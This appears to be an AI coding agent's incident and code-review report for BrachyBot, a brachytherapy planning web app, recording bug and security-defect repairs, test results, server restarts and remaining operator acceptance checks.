inputs are restored, the route reports `verified` and rechecks them. If shared
inputs have changed, the route reports `stale` and retains the geometry only as
review material, requiring a re-plan before clinical use. Missing restore-time
arrays are treated as pending, not as evidence that all Needles are unsafe.

### 2.6 Restored label-volume export mutated a read-only array

#### Confirmed failure mechanism

The same restart log contained `Label volume export failed: assignment
destination is read-only` at `web/routes/viewer_routes.py` while the endpoint
merged embedded nnUNet labels into the OAR array. Workspace hydration restores
large NPY sidecars as read-only memory maps. The old `astype(np.uint16,
copy=False)` conversion was allowed to return that read-only array when its
dtype already had sufficient width, after which `oar_array[mask] = dst_label`
raised `ValueError`.

#### Implemented repair

The merge path now always creates a private C-contiguous writable `uint16`
buffer with `np.array(..., dtype=np.uint16, copy=True, order="C")` before any
label assignment. This changes only the temporary export buffer; it does not
mutate the restored sidecar, alter the clinical OAR source, or change label
IDs. Shape validation and the existing embedded-label safety policy remain in
place.

#### Acceptance contract

After restart, label-volume export must complete for a restored read-only OAR
sidecar and preserve the expected merged label values. A shape mismatch must
still skip the merge safely rather than indexing an incompatible array.

## 3. Files changed for this incident pass

Production code and assets:

- `tool_factory/segmentation_alignment.py`
- `tool_factory/CTV_seg/__init__.py`
- `web/routes/planning_routes.py`
- `web/server_support.py`
- `web/workspace_store.py`
- `web/app/static/js/brachybot-ui-api.js`
- `web/app/static/js/brachybot-3d-manual.js`
- `web/app/static/js/brachybot-manual-annotation.js`
- `web/app/static/js/brachybot-chat-core.js`
- `web/app/static/js/brachybot-chat-todo.js`
- `web/app/index.html`
- `tool_factory/seed_plan/planning_pipeline.py`
- `web/planning_runs.py`
- `web/routes/viewer_routes.py`

Regression coverage:

- `tests/test_uploaded_mask_provenance.py`
- `tests/test_workspace_store.py`
- `tests/test_round7_regressions.py`
- `tests/test_workspace_frontend.py`
- `tests/test_review_round6_regressions.py`
- `tests/test_needle_obstacle_safety.py`
- `tests/test_planning_runs.py`

## 4. Verification record

### Source and artifact integrity

- Remote SHA-256 values for all 16 changed production/test files exactly matched
  the reviewed local staging copies before testing and restart.
- Python compilation passed for every modified Python source file.
- JavaScript syntax checks passed for all five affected frontend scripts.
- `git diff --check` passed for the complete incident patch.

### Additional verification — restored Needle and read-only export repair

- Remote commit `56ba9615fbdd847128a48cf36ffca1a73c6be479` contains the repair
  and was pushed to `origin/codex/session-task-recovery`.
- The focused Needle/Planning run suite passed: `23 passed`; the workspace
  hydration and uploaded-mask suite passed: `42 passed`.
- The complete remote repository suite passed: `745 passed, 6 skipped, 4
  warnings in 69.02 seconds`.
- Python compilation passed for the modified planning, Viewer, Planning run,
  and regression-test files. Node v24 syntax checking passed for the modified
  3D manual bundle.
- An isolated Flask route regression with a legacy snapshot containing seven
  saved geometries and no provenance returned the saved Needle instead of
  dropping it, and reported `safety_check=legacy_verified` plus
  `plan_needs_replan=true`.
- The deployed server was restarted after the commit: old PID `2208988` was
  terminated; new PID `2284728` started at `2026-08-26 05:29:01 +0800`, uses
  `/home/lht/.conda/envs/brachytherapy/bin/python3.12 web/server.py
  --host 0.0.0.0`, listens on `0.0.0.0:8080`, and serves the root page with
  HTTP 200. The target case's background hydration completed successfully.
- The target pre-repair snapshot was rechecked before deployment: it contained
  seven `verified_needle_geometry` entries and seven serialized seed-plan
  trajectories, while its legacy active run had no `needle_safety_context`.
  This proves the incident was display-time withholding, not lost persistence.
- The authenticated browser acceptance of the target case's `/seeds_3d`
  response remains an operator-level check because this maintenance session did
  not possess the user's authenticated browser cookie. No authentication
  boundary was bypassed to manufacture that evidence.

### Automated tests

- Focused and related suite: `303 passed, 3 warnings`.
- Full repository suite in an environment with deployment/API-provider variables
  intentionally removed: `742 passed, 6 skipped, 4 warnings in 89.29 s`.
- The skipped tests are the repository's existing conditional skips.
- Warnings are three existing SWIG type deprecations and one existing
  `datetime.utcnow()` deprecation in training-monitor code.
- An initial non-isolated full run produced two failures in
  `tests/test_brain_system.py` because the shell exposed Anthropic deployment
  variables, violating those tests' explicit `brain unavailable` premise. Both
  tests passed when those variables were removed, and the complete isolated run
  then passed with no failures.

### Live deployment

- Branch: `codex/session-task-recovery`.
- HEAD remains `2234c2dda2c022ff9fc3c30941033e22b3f774b6`; this pass is an
  uncommitted working-tree repair and preserves unrelated existing changes.
- Old process: PID `1781244`, started `2026-08-26 00:07:30`, stopped gracefully.
- New process: PID `2051260`, started `2026-08-26 03:37:12`, executable
  `/home/lht/.conda/envs/brachytherapy/bin/python3.12`, command
  `web/server.py --host 0.0.0.0`, parent PID 1.
- Listener: `0.0.0.0:8080`.
- Live root request: HTTP 200.
- Live HTML served the repaired asset revisions: chat core 14, chat todo 20,
  3D manual 64, and manual annotation 16.
- Runtime log: `.runtime/server.log`.

### Live browser acceptance attempt

On 2026-08-26 the deployed page was opened in the Codex in-app browser through
an SSH loopback tunnel, using both `127.0.0.1:18080` and `localhost:18080`. The
operator explicitly authorized one non-clinical `你好` message in the separate
`web` test account. Before any retry, the browser state was inspected to prevent
a duplicate send.

No message was actually submitted. On both loopback origins the full-page
`authOverlay` remained visibly active (`display: grid`, full viewport, pointer
events enabled), because those origins did not have an authenticated BrachyBot
session cookie after the server restart. The background application shell still
rendered the session label and composer, but the overlay correctly intercepted
the send-button interaction. The textarea retained `你好`; the chat DOM retained
zero matching user turns, no Thinking node, and no assistant response; its
measured bottom gap remained zero. Browser logging contained no JavaScript error,
only the expected `Authentication required` warnings from unauthenticated CTV
availability and Data Tree hydration probes.

No application password was guessed, no account was created or modified, and no
authentication/session boundary was bypassed. Consequently this browser pass
confirms that the restarted server and repaired assets load in a real browser,
but it is **not** evidence that the authenticated live-chat scroll workflow has
passed. That behavioral acceptance remains in the operator checklist below; the
automated DOM contracts and full test suite are the current executable evidence
for the chat repair.

### Deployment security boundary

The restart deliberately preserved the pre-existing
`BRACHYBOT_ALLOW_INSECURE_REMOTE` / trusted-network development posture and the
existing model-provider configuration without printing secret values. Startup
continues to emit the explicit unsafe-development warning. This incident pass did
not silently convert the deployment to TLS, add/remove an API key, or change cookie
policy. Production exposure still requires the separate TLS/reverse-proxy decision
documented in the older CR-11 section below.

## 5. Remaining interactive acceptance boundary

The repaired page has been loaded through an SSH tunnel in a real browser and the
new assets are active. Automated source, DOM-contract, backend, workspace, and full
repository tests are complete. Because the isolated browser origin did not possess
an authenticated BrachyBot cookie, no chat turn was submitted during the live
browser attempt. The final operator acceptance should therefore still exercise
the original patient case in its authenticated browser context:

1. reopen the restored case and confirm the active CTV reports approximately
   `37.5366 cm3`, not `12,970 cm3`;
2. Add Needle and Add Seed, save, reload, and confirm only changed geometry is
   safety-gated and retained;
3. scrub all three 2D axes after the compact dose volume reaches `ready`, checking
   that dose/label appearance and Data Tree opacity stay invariant;
4. send a chat turn and confirm the first Thinking/answer content remains fully
   visible above the composer while the workflow dock appears and folds;
5. deliberately scroll upward during a long answer and confirm auto-follow does not
   pull the viewport back until a new user turn is sent;
6. reopen the target restored case and confirm all seven persisted Needles are
   rendered; if the old legacy plan is still active, confirm the UI displays a
   review-only re-plan warning rather than silently hiding them;
7. trigger label-volume export on the restored case and confirm the read-only
   sidecar merge completes without `assignment destination is read-only`.

---

# Current Code Review Resolution — 2026-08-25 (Implemented and Re-Verified)

> **Authoritative current-source verdict.** All 18 confirmed review findings are now fixed in the current remote working tree and have been re-checked after implementation. The six findings that were still open in the preceding review—CR-01, CR-02, CR-03, CR-09, CR-11, and CR-12—now have dedicated regression coverage. The older pre-repair status section is preserved below for traceability and is explicitly marked superseded.
>
> **Deployment boundary.** The active PID 1297468 was started before these source changes and has no reload mode. It has not loaded this repair. Its current configuration still deliberately enables BRACHYBOT_ALLOW_INSECURE_REMOTE while secure cookies and an API key are absent. Therefore the source review is closed, but production deployment/security verification remains pending until the operator selects a safe TLS/reverse-proxy configuration and restarts the service.

## 1. Final disposition

| Scope | Status | Count / evidence |
|---|---|---|
| Current source findings | **FIXED** | 18 of 18 |
| Remaining source-code findings from this review | **NONE** | 0 |
| Newly repaired in this pass | **FIXED AND REGRESSION-TESTED** | CR-01, CR-02, CR-03, CR-09, CR-11, CR-12 |
| Related-module test run | **PASS** | 165 passed, 3 warnings |
| Full repository test run | **PASS** | 736 passed, 6 skipped, 4 warnings in 69.61 seconds |
| Patch hygiene | **PASS** | Python compilation and git diff --check |
| Active service deployment | **PENDING / OLD PROCESS** | PID 1297468, started 2026-08-24 06:25:50, no reload |
| Active service transport posture | **EXPLICITLY UNSAFE** | 0.0.0.0:8080; secure cookie false; API key absent; insecure override true |

## 2. Repairs completed in this pass

### CR-01 — Final deletion now invalidates quota accounting

The CT deletion and grouped-report deletion paths now invalidate the account storage total after their last direct PDF unlink:

- web/routes/data_routes.py:715 covers CT plus dependent report cleanup.
- web/routes/data_routes.py:915 covers grouped report cleanup.
- Existing screenshot and single-report deletion invalidations remain in place.

Regression: tests/test_data_tree_export_system.py:634 deliberately repopulates the quota cache between snapshot replacement and the final unlink, then verifies that both group:report and image:ct return the true on-disk total. This reproduces the exact residual race from the second review.

### CR-02 — One quota protocol now covers cross-type and direct outputs

Workspace quota control now includes:

- account-wide pending-byte reservations at web/workspace_store.py:1277 and :3097;
- category ownership locks at web/workspace_store.py:1281 and :1310;
- a direct-output transaction with backup, final on-disk validation, and rollback at web/workspace_store.py:1323;
- snapshot writes under the account commit lock at web/workspace_store.py:3117;
- screenshot writes under the same account commit lock at web/workspace_store.py:3210;
- artifact writes under both category and account locks at web/workspace_store.py:3223;
- pre-operative, intra-operative, DICOM-RT, and STL generation routed through the direct-output transaction at web/routes/planning_routes.py:4833, :4912, :5150, and :5287.

Long scientific generation does not hold the account lock. Instead, expected bytes are reserved atomically, ordinary writers include outstanding reservations in their capacity decisions, generation owns only its artifact category, and final commit validation either accepts the real disk total or restores the previous category. This avoids both quota overshoot and a long account-lock/deadlock window.

Regressions:

- tests/test_workspace_store.py:1125 proves an upload and screenshot cannot approve the same remaining bytes.
- tests/test_workspace_store.py:1197 proves direct-output overage restores the prior category, pending reservations block competing writers, and reservation bytes are released after commit.

### CR-03 — Session screenshots now use an API-key or signed-download boundary

The session screenshot route no longer accepts an API-key-configured request merely because the user has a cookie:

- web/server_support.py:2950 generates a durable HMAC URL bound to session ID and filename.
- web/server_support.py:2966 accepts either a valid X-API-Key header or that case-bound signature.
- web/routes/planning_routes.py:6083 persists the signed URL when API-key authentication is active.
- web/routes/planning_routes.py:6190 enforces the key/signature check before serving the file.

This design preserves browser image loading—HTML image elements cannot attach X-API-Key—without leaving the route outside the configured API-key boundary. The signature is safe to persist because the route independently requires an authenticated owner cookie and verifies case ownership; rotating the API key invalidates previously issued signatures.

Second-pass implementation audit: the first repair draft used a one-hour signed URL. That was rejected before closure because chat attachments are persisted and restored after that window; an expiring URL would have broken otherwise-authorized historical images. The final implementation uses the durable, owner-checked case-bound signature described above.

Regression: tests/test_workspace_auth.py:363 proves a plain URL returns 401, a valid API key returns 200, a valid signed URL returns 200, a tampered signature returns 401, and a different authenticated user cannot use the otherwise-valid signed URL to read the owner's case (403).

### CR-09 — Every invalid DICOM batch follows rollback

The invalid-extension branch in web/server.py:995 now raises WorkspaceError instead of returning from inside the commit loop. It therefore enters the same rollback handler as quota, stream, and filesystem failures. The rollback also invalidates quota accounting after its final direct unlink at web/server.py:1032.

Regression: tests/test_workspace_auth.py:329 uploads valid.dcm followed by invalid.txt, verifies the request returns 400, and verifies no dicom_* directory or earlier committed file survives.

### CR-11 — Remote binding now fails closed unless unsafe mode is explicit

web/server.py:1862 now enforces two independent remote-bind requirements:

1. a remote listener needs an API key unless BRACHYBOT_ALLOW_INSECURE_REMOTE explicitly selects development mode;
2. an API key alone no longer bypasses transport safety—a remote listener also needs BRACHYBOT_COOKIE_SECURE=1 unless the same explicit unsafe-development override is set.

When the override is used, startup emits an unmistakable UNSAFE DEVELOPMENT OVERRIDE warning. This implements a safe default while retaining the explicitly requested trusted-development capability boundary.

Regressions:

- tests/test_review_round6_regressions.py:980 proves a configured API key does not bypass the Secure-cookie requirement.
- tests/test_review_round6_regressions.py:993 proves the explicit unsafe override remains available and visibly warns.

Important deployment note: the currently running process predates this code and is still configured in the unsafe mode. CR-11 is fixed in source, not yet remediated in the active deployment.

### CR-12 — Both event and step histories remain bounded

web/chat_tasks.py now enforces:

- MAX_TASK_JOURNAL_EVENTS = 2000 at line 28;
- MAX_TASK_STEPS = 2000 at line 32;
- one shared bounded append path at line 134;
- step trimming inside publish() at lines 162-163;
- the same bounded append path for cancel() at line 208.

The absolute event sequence still advances when old events are trimmed, so reconnect/replay semantics are preserved.

Regression: tests/test_chat_tasks.py:680 publishes beyond both limits, cancels exactly after overflow, verifies both retained collections stay at their caps, verifies the absolute sequence count, and confirms the terminal cancellation event remains replayable.

## 3. Second-pass verification of all 18 findings

| ID | Final current-source status | Verification basis |
|---|---|---|
| CR-01 | **FIXED** | Final-unlink invalidation plus cache-repopulation regression |
| CR-02 | **FIXED** | Reservations, category transaction, cross-type concurrency, rollback regression |
| CR-03 | **FIXED** | API-key/header or case-bound HMAC signature regression |
| CR-04 | **FIXED** | Auth epoch and two-client password-change invalidation remain passing |
| CR-05 | **FIXED** | Startup/export retention cleanup remains passing |
| CR-06 | **FIXED** | Automatic replan manual-overlay deactivation remains passing |
| CR-07 | **FIXED** | Request-targeted lease enforcement remains passing |
| CR-08 | **FIXED** | Collision-safe upload allocation remains passing |
| CR-09 | **FIXED** | Invalid-extension partial-commit integration regression |
| CR-10 | **FIXED** | External imaging-root ownership/allowlist remains passing |
| CR-11 | **FIXED IN SOURCE** | Remote bind now requires Secure cookie or explicit unsafe mode; deployment still unsafe |
| CR-12 | **FIXED** | Event, step, cancel-cap, and replay regression |
| CR-13 | **FIXED** | CT-first series selection remains passing |
| CR-14 | **FIXED** | Seed geometry interference threshold remains passing |
| CR-15 | **FIXED** | Authoritative manual/automatic export selection remains passing |
| CR-16 | **FIXED** | Collision-safe export filenames remain passing |
| CR-17 | **FIXED** | Malformed numeric inputs remain safely handled |
| CR-18 | **FIXED** | Missing CT/mask early-return behavior remains passing |

No other confirmed source defect was found during the second inspection of the repaired paths.

## 4. Validation record

The following validations were run against the current remote working tree:

- Python compilation of all modified source and test files: passed.
- Eight newly added focused regressions: passed.
- Related modules—WorkspaceStore, Data Tree/export, workspace authentication, ChatTask, and round-6 review regressions: 165 passed, 3 warnings.
- Full test suite: 736 passed, 6 skipped, 4 warnings in 69.61 seconds.
- git diff --check: passed.

The four full-suite warnings are pre-existing dependency/deprecation warnings: three SWIG type warnings and one datetime.utcnow() deprecation warning in training-monitor code. They are not failures of these repairs.

## 5. Deployment gate still required

The source repair must not be described as deployed yet:

- active PID: 1297468;
- process start: 2026-08-24 06:25:50;
- command: /home/lht/.conda/envs/brachytherapy/bin/python3.12 web/server.py --host 0.0.0.0;
- listener: 0.0.0.0:8080;
- source files were updated on 2026-08-25 after process start;
- no --reload option is present;
- BRACHYBOT_COOKIE_SECURE is false;
- BRACHYBOT_API_KEY is absent;
- BRACHYBOT_ALLOW_INSECURE_REMOTE is true.

Before production use, configure TLS termination, set BRACHYBOT_COOKIE_SECURE=1, configure the intended API-key policy, remove the insecure override, restart the service, record the new PID/start time, and repeat live authentication/cookie/screenshot/quota smoke tests. Restarting the current plain-HTTP configuration without making that deployment choice would load the correctness fixes but would intentionally retain an unsafe transport posture.

---

## 6. Addendum — forgotten CR-19 found during live deployment smoke test

When the repaired service was restarted and smoke-tested with the real HTTP
API on 2026-08-26, an additional reachable defect surfaced that neither review
pass had covered.

### CR-19 — Terminally purging a trashed case always returned 404

Confirmed issue. `DELETE /api/sessions/<session_id>/purge` always returned
404 "Case session was not found" for a case already in trash, which is the
exact case the endpoint exists for. Because trash retention is enforced only
at `WorkspaceStore.__init__`, and the long-running server never reaches that
path again, trashed cases could not be reclaimed except by restarting the
service.

Root cause. `purge_case_session` began its work with
`assert_target_editable(user, session_id)`, whose `get_session()` call omits
`include_trashed=True` and therefore raises `WorkspaceNotFound` for a trashed
session — the lease guard raised the generic 404 before `permanently_delete`
was ever reached. This regression was inherited from a pre-existing
lease-protection addition and remained unnoticed because the review tests only
covered active-case deletion and restore.

Resolution. `web/routes/session_routes.py` — the lease assertion now runs only
when the resolved session is still active; trashed sessions purge directly
(ownership is still enforced inside `permanently_delete`). Regression added at
`tests/test_workspace_auth.py:test_trashed_case_can_be_purged`, which trashes
two cases, purges both, and verifies the active case is untouched.

Verification. Focused and full suite with a clean environment: 741 passed,
6 skipped, 2 pre-existing environment-dependent `test_brain_system` failures
on the untouched tree (live LLM credentials present). Live check against the
restarted service: `DELETE /api/sessions/<id>/purge` for the smoke-test case
returned 200 and `trashed_count` dropped to 0.

---

# Superseded Source Review — 2026-08-25 (Before Final Repair)

> **Historical pre-repair status only.** This section records the second-pass verification before the final implementation above. Its partial/open dispositions are preserved as evidence of what the repair needed to address; they are not the current disposition of the findings.
>
> **Original scope.** At the time this section was written, only the report had been updated. The subsequent authoritative section above records the implemented source changes and final verification.

## 1. Review boundary and evidence basis

- Repository: /home/lht/snap/brachyplan/BrachyBot
- Source checkout observed: branch codex/session-task-recovery, HEAD 2234c2dda2c0 (working tree dirty; the review was performed against the current files, not only the committed revision).
- The review re-checked each original finding against the current source, followed critical paths into their callers, and used focused runtime/manual reproductions where a source-only conclusion would be insufficient.
- Current line numbers refer to the source tree observed on 2026-08-25. A later patch may shift them; the route/function names and the reproductions are the primary identification of each defect.
- The result is intentionally split into source status and live-service status. Passing tests against the current files does not prove that the already-running process has loaded the current files.

## 2. Executive summary

| Disposition in the current source | Count | Meaning |
|---|---:|---|
| FIXED | 12 | The original defect was re-checked and no remaining defect was found in the reviewed path. |
| PARTIAL — residual defect | 5 | The remediation is real and improves the path, but a reachable residual path still reproduces the original class of failure. |
| NOT FIXED — security/deployment blocker | 1 | The original defect remains materially present; a warning or partial mitigation is not sufficient. |
| **Total** | **18** | All original findings have a current disposition. |

The five residual defects are CR-01, CR-02, CR-03, CR-09, and CR-12. CR-11 remains unresolved. These six items are the required repair scope for the next implementation pass.

The current source test status is strong but not sufficient to close the review:

- Targeted regression set: 150 passed, 3 warnings.
- Full current suite: 728 passed, 6 skipped, 4 warnings.
- git diff --check: passed.
- The successful suite does not cover every concurrent writer, every direct artifact deletion route, the unguarded session screenshot endpoint, the invalid-extension rollback branch, the remote-cookie deployment posture, or the separately unbounded ChatTask.steps list. Those gaps are why the residual findings below remain open.

## 3. Current disposition of all findings

| ID | Current status | Current-source conclusion | Evidence / repair focus |
|---|---|---|---|
| CR-01 | **PARTIAL — residual defect** | Quota-cache invalidation was added to several deletion paths, but CT cleanup and grouped report cleanup still unlink files directly after snapshot replacement without a final invalidation. | web/routes/data_routes.py:683-711 and :894-907; see §4.1. |
| CR-02 | **PARTIAL — residual defect** | Upload-vs-upload serialization is fixed, but screenshots and direct generated DICOM output are not covered by one reservation/commit protocol. Cross-type writes can still exceed the quota. | web/workspace_store.py:3002-3067; web/routes/planning_routes.py:5121-5129; see §4.2. |
| CR-03 | **PARTIAL — residual defect** | Most session/workspace APIs require an API key, but the session-scoped screenshot route remains callable without one. | web/routes/planning_routes.py:6207-6208; see §4.3. |
| CR-04 | **FIXED** | Password changes now advance the account auth epoch and invalidate other sessions. | web/auth.py:92-113,219-240; two-client recheck passed. |
| CR-05 | **FIXED** | Startup cleanup and export-job retention remove stale scene exports, staging files, and terminal export-job artifacts. | web/workspace_store.py:1276-1341; web/export_service.py:1246-1280; lifecycle recheck passed. |
| CR-06 | **FIXED** | Automatic replanning deactivates stale manual overlays when new automatic geometry becomes authoritative, while the in-flight baseline remains safe. | tool_factory/seed_plan/planning_pipeline.py:1303-1333,2215-2219,2344-2347,2727-2731; state-machine recheck passed. |
| CR-07 | **FIXED** | The global editability hook now validates the request-targeted case, including JSON session_id, instead of relying only on the selected case. | web/server.py:863-891; locked-target runtime recheck returned 409. |
| CR-08 | **FIXED** | Upload allocation probes a free filename while holding the account lock and returns the actual allocated path to the caller. | web/workspace_store.py:3012-3058; web/server.py:957-963; collision recheck passed. |
| CR-09 | **PARTIAL — residual defect** | Exception rollback removes committed files for quota/stream/filesystem failures, but an invalid-extension return inside the try block bypasses rollback after earlier files have already been committed. | web/server.py:980-1024, especially :990-991; see §4.4. |
| CR-10 | **FIXED** | Configured external roots are allowlisted for the supported CT/MR/US types and remain subject to the workspace ownership check. | web/server_support.py:2805-2836; web/server.py:1112-1136; external CT viewer recheck returned 200. |
| CR-11 | **NOT FIXED — security/deployment blocker** | Remote binding still permits a non-secure session-cookie posture by default when BRACHYBOT_COOKIE_SECURE is absent; startup only warns and does not force secure cookies or reject unsafe remote HTTP. | web/auth.py:70-75; web/server.py:1853-1875; live process is bound to 0.0.0.0:8080; see §4.5. |
| CR-12 | **PARTIAL — residual defect** | The event journal is capped at 2,000 retained events, but ChatTask.steps remains unbounded and cancel() can leave the event list at cap+1. | web/chat_tasks.py:22-29,97-101,148-168,191-200,217-242; see §4.6. |
| CR-13 | **FIXED** | DICOM series selection ranks CT ahead of other modalities and selects the largest series within the modality tier. | web/server.py:1177-1219; CT-vs-MR recheck selected CT. |
| CR-14 | **FIXED** | Seed interference uses seed length, two seed radii, and a safety margin rather than only a center-to-center distance. | web/app/static/js/brachybot-3d-manual.js:233-249; backend threshold recheck passed. |
| CR-15 | **FIXED** | Seed-plan export prefers the authoritative manual serialized plan, then automatic serialized output, then controlled fallbacks. | web/routes/planning_routes.py:516-557; manual-plan and fallback rechecks passed. |
| CR-16 | **FIXED** | Export artifact names are collision-safe after the normalized/truncated base name. | web/export_service.py:686-696; long-name collision recheck produced distinct files. |
| CR-17 | **FIXED** | Malformed numeric TTL/limit input falls back safely instead of raising a request-level 500. | web/workspace_store.py:2813-2819 and current audit-limit handling; endpoint recheck returned 200. |
| CR-18 | **FIXED** | Seed planning returns before CT/mask-dependent work when the required context is absent. | tool_factory/seed_plan/planning_pipeline.py:1370-1375; targeted and full-suite checks passed. |

## 4. Confirmed residual defects requiring repair

The following are not speculative concerns. Each item has a reachable code path and a reproduction against the current source. They should remain open until the stated acceptance conditions are met.

### 4.1 CR-01 — Quota cache remains stale after some direct artifact deletions

Current partial remediation. WorkspaceStore.permanently_delete() now invalidates the per-account quota cache (web/workspace_store.py:2904-2917). The screenshot deletion path (web/routes/data_routes.py:534-546) and the single-report PDF path (:878-892) also invalidate after deletion.

Remaining reachable paths.

- CT deletion at web/routes/data_routes.py:683-711 replaces the snapshot section and then directly unlinks report PDFs at :706-711 without a final quota-cache invalidation.
- Group report deletion at web/routes/data_routes.py:894-907 replaces the snapshot section and then directly unlinks report PDFs without invalidating after those unlinks.

Direct recheck. A temporary WorkspaceStore account was populated with a report artifact. The observed quota values were:

- after artifact creation: before=590 bytes;
- after snapshot replacement: after_snapshot_write=1041 bytes;
- after direct unlink without the deletion hook: after_direct_unlink_without_hook=1041 bytes;
- after an explicit invalidation: after_explicit_hook=1024 bytes.

The stale value was therefore 17 bytes, equal to the deleted artifact in this reproduction. This is a real accounting defect, not merely a cache-efficiency issue: a subsequent quota decision can reject a write using bytes that no longer exist on disk.

Required repair and acceptance. Route every account-owned artifact deletion through one helper that performs the unlink and invalidation, or add an invalidation immediately after every direct unlink in both residual routes. Add route-level regressions for CT deletion and grouped report deletion that assert the reported usage decreases to the post-delete disk total.

### 4.2 CR-02 — Quota enforcement is still non-atomic across writer types

Current partial remediation. web/workspace_store.py:3002-3058 adds a per-account _quota_commit_lock around the upload check-through-commit path. A concurrent upload-only reproduction correctly produced one success and one WorkspaceQuotaExceeded, with final usage within the quota.

Remaining reachable paths.

- write_screenshot() at web/workspace_store.py:3060-3067 does not take the same _quota_commit_lock; it only performs replacement-capacity checking and writes the file.
- Direct DICOM output at web/routes/planning_routes.py:5121-5129 calls ensure_capacity(user, dose_reserve_bytes) before generation, but that is a check, not a reservation held until the output is committed. workspace_output_dir() at :960-969 checks zero additional bytes, and the later validation at :971-983 occurs after output has already been written.

Cross-type concurrency recheck. With a synchronized baseline of 561 bytes and a quota of 661 bytes, a screenshot write and an upload were started together. Both succeeded:

- outcomes: ['screenshot_ok', 'upload_ok'];
- actual final usage: 721 bytes;
- quota: 661 bytes;
- overshoot: 60 bytes, with 160 bytes of new data admitted against a 100-byte allowance.

This proves that serializing only uploads does not enforce the account quota globally.

Required repair and acceptance. Put every quota-consuming writer—including uploads, screenshots, generated DICOM/other workspace outputs, and replacement writes—behind one account-scoped reservation/commit/release protocol. A preflight check followed by an unprotected generation step is insufficient. The protocol must release reservations on generation failure and remove or roll back files that were committed before a later failure. Add a deterministic concurrent cross-type regression and an output-generation failure regression; both must prove that final on-disk usage never exceeds the configured quota and that failed output leaves no unaccounted files.

### 4.3 CR-03 — Session-scoped screenshot access still bypasses the API-key boundary

Current partial remediation. Session/workspace API routes in web/routes/session_routes.py now carry @require_api_key (for example at :76-77, :107-108, :298-299, :317-318, :418-419, and :445-446).

Remaining route. In web/routes/planning_routes.py, the route

/api/sessions/<session_id>/screenshots/<filename>

is declared at :6207 and has only @rate_limit at :6208; it does not require the configured API key.

Fresh configured-key recheck. In an app process configured with an API key:

- GET /api/sessions without a key: 401;
- GET /api/sessions with a key: 200;
- session-scoped screenshot without a key: 200;
- the same screenshot with a key: 200;
- the legacy screenshot route without a key: 401.

The session screenshot route therefore remains an inconsistent, unauthenticated access path. Rate limiting is not an authentication boundary.

Required repair and acceptance. Add the same API-key protection used by the sibling session/workspace routes, unless the route is deliberately documented as a public/signed-download endpoint with an independently verified authorization design. Add a regression asserting that a missing or invalid key is rejected and that a valid key still serves the authorized session screenshot.

### 4.4 CR-09 — Invalid file extension can bypass batch rollback after partial commit

Current partial remediation. The batch DICOM upload logic in web/server.py:980-1024 now attempts rollback for quota, stream, and filesystem exceptions and removes already committed paths and empty directories.

Remaining branch. The invalid-extension check at web/server.py:990-991 returns a 400 response directly from inside the try block. A return does not execute the except rollback handler. If an earlier file in the same batch has already been committed, the request can report failure while leaving that earlier file on disk.

Direct recheck. A batch containing a valid valid.dcm followed by an invalid invalid.txt returned 400, but left a file under a path like:

dicom_20260825_143626/valid.dcm

This is a real partial-commit defect: the client sees a failed batch while storage and quota retain part of the rejected upload.

Required repair and acceptance. Either pre-validate the complete batch before committing any file, or route invalid-extension failures through the same rollback path as all other failures. Add tests for invalid extension in the first, middle, and last batch positions; after every failed request, assert no file from that batch and no empty batch directory remains.

### 4.5 CR-11 — Remote HTTP can still run without secure session cookies

Current state. web/auth.py:70-75 sets SESSION_COOKIE_SECURE to false unless BRACHYBOT_COOKIE_SECURE is explicitly enabled. web/server.py:1853-1875 emits a warning for non-loopback binding but does not force secure cookies and does not reject remote HTTP when the API key is absent or when the unsafe override is present.

Live deployment evidence at this review. The active process was:

/home/lht/.conda/envs/brachytherapy/bin/python3.12 web/server.py --host 0.0.0.0

It was PID 1297468, started on 2026-08-24 at 06:25:50, and listening on 0.0.0.0:8080. The observed environment posture was:

- BRACHYBOT_COOKIE_SECURE: unset/false;
- BRACHYBOT_API_KEY: unset;
- BRACHYBOT_ALLOW_INSECURE_REMOTE: truthy.

The exact secret value was not inspected or recorded. This is a deployment/security blocker because a browser session cookie can be sent over plain HTTP to a remotely reachable listener. A startup warning is not a repair.

Required repair and acceptance. Choose and enforce a safe deployment contract: for example, require TLS/reverse-proxy termination and force SESSION_COOKIE_SECURE=True for any non-loopback deployment, or refuse to start a remote HTTP listener unless an explicit, visibly unsafe development mode is selected. Add a startup test for non-loopback binding and a live smoke test that verifies cookie attributes and the intended refusal/override behavior. Do not mark CR-11 fixed merely because a warning is logged.

### 4.6 CR-12 — Event journal is bounded, but task steps and terminal trim are not

Current partial remediation. web/chat_tasks.py:22-29 defines MAX_TASK_JOURNAL_EVENTS=2000; publish() trims _events at :148-168; and iter_events() at :217-242 understands the resulting absolute sequence base. A 10,000-event replay retained 2,000 events with base=8000 and returned the retained replay correctly.

Remaining defects.

1. ChatTask.steps is separately unbounded. publish() appends every step at web/chat_tasks.py:148-150. A 10,000-step reproduction retained _events=2000 but steps=10000.
2. cancel() at web/chat_tasks.py:191-200 appends the terminal done event without applying the cap. Starting with exactly 2,000 retained events therefore leaves 2,001 events.

Required repair and acceptance. Bound steps as well as _events, with a documented retention policy that does not break the task API. Apply the same trim/increment logic after terminal cancellation (and any other terminal publisher) so the invariant is always len(_events) <= MAX_TASK_JOURNAL_EVENTS. Add tests for normal overflow, step overflow, cancellation at exactly the cap, and replay from both retained and trimmed sequence numbers.

## 5. Verified fixes (re-checked and currently closed in source)

These items were not left open based only on a code glance; each was checked against its changed implementation and an associated targeted reproduction or regression.

- **CR-04 — Password-change session revocation.** web/auth.py compares the session bb_auth_epoch with the database user epoch, bumps the epoch on password change, and rebinds only the current session. In the two-client recheck, the other client’s old session received 401, the old password was rejected, and the new password succeeded.
- **CR-05 — Orphan/stale workspace and export cleanup.** Startup cleanup in web/workspace_store.py:1276-1341 removes stale scene exports and .part staging files; web/export_service.py:1246-1280 applies one-hour retention to terminal export jobs and their artifacts. The stale-directory and crashed-staging reproductions were cleaned up.
- **CR-06 — Stale manual overlay after automatic replanning.** _deactivate_manual_overlay() is invoked at trajectory initialization/refinement and seed-planning transitions. The in-flight stepwise replan retains a safe baseline, then the fresh automatic geometry is published without the old manual overlay.
- **CR-07 — Request-targeted lock enforcement.** The global lease hook in web/server.py:863-891 uses the same target precedence as the request payload—header, JSON session_id, query, selected case—before calling assert_editable. A request targeting a case locked by another browser returned 409 even when a different case was selected in the UI.
- **CR-08 — Upload name collision.** The upload path probes a free name under the account lock and returns the actual path. Two same-name uploads became same-name.nii and same-name_1.nii with distinct contents.
